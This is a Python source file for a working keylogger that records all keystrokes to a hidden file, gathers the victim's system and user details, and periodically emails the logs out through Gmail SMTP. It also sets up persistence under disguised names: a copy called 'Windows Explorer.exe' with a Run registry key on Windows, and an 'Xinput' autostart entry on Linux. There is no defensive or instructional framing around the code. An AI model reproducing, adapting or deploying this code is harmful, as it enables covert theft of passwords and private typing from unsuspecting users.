#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
import os
import shutil
import subprocess
import sys
import stat
import platform
import getpass
import inspect
import socket
from os.path import expanduser

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.data_to_send  = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.system_info = self.get_system_info()
        self.users_home_directory = expanduser("~")
        if sys.platform.startswith("win"):
            self.current_os = "windows"
            self.evil_file_location = os.environ["appdata"]
            self.evil_file_location=fr"{self.evil_file_location}\log.txt"
            with open(self.evil_file_location,"a") as f:
                f.close()
        else:
            self.current_os = "linux"
            self.evil_file_location  = expanduser("~")
            self.evil_file_location = f"{self.evil_file_location}/.log.txt"
            with open(self.evil_file_location,"a") as f:
                f.close()


    def append_to_log(self, string):
        self.log = string
        with open(self.evil_file_location,"a") as f:
            f.write(self.log)
            f.close()

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " <" + str(key)[4:] + "> "
        self.append_to_log(current_key)

    def report(self):
        if self.is_connected():
            with open(self.evil_file_location) as f:
                self.data_to_send = f.read()
                f.close()
            self.send_mail(self.data_to_send)
            with open(self.evil_file_location,"w") as f:
                f.write("")
                f.close()

        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def is_connected(self):
        try:
            socket.create_connection(("www.google.com", 80))
            return True
        except OSError:
            pass
        return False

    def send_mail(self, message):
        message = "Subject: Keylogger Report\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def become_persistent(self):
        if sys.platform.startswith("win"):
            self.become_persistent_on_windows()
        elif sys.platform.startswith("linux"):
            self.become_persistent_on_linux()


    def become_persistent_on_windows(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            self.log = "** Keylogger started ** "
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "{evil_file_location}"',shell=True)

    def become_persistent_on_linux(self):
        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "/autostart/"
        autostart_file = autostart_path + "xinput.desktop"
        if not os.path.isfile(autostart_file):
            self.log = "** Keylogger started **"
            try:
                os.makedirs(autostart_path)
            except OSError:
                pass

            destination_file = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, destination_file)
            self.chmod_to_exec(destination_file)

            with open(autostart_file, 'w') as out:
                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + destination_file + "\n")

            self.chmod_to_exec(autostart_file)
            subprocess.Popen(destination_file)
            sys.exit()

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
